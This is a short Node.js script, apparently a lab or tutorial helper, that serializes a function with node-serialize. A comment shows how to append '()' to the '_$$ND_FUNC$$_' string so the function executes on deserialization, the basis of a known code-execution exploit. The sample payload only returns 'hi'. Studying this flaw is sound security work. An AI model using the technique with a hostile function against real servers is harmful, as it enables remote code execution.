var serialize = require('node-serialize');

var x = {
  test: function() {
    return 'hi';
  }
};

var serialized = serialize.serialize(x);
console.log("Serialized:\n" + serialized);

/*
to run: node to_serialize.js
payload to put after output from code: "_$$ND_FUNC$$_function (){ return 'hi'; }()"
*/

/*
var serialize = require('node-serialize');

x = {
test : function(){ return 'hi'; }
};

console.log("Serialized: \n" + serialize.serialize(x));
*/
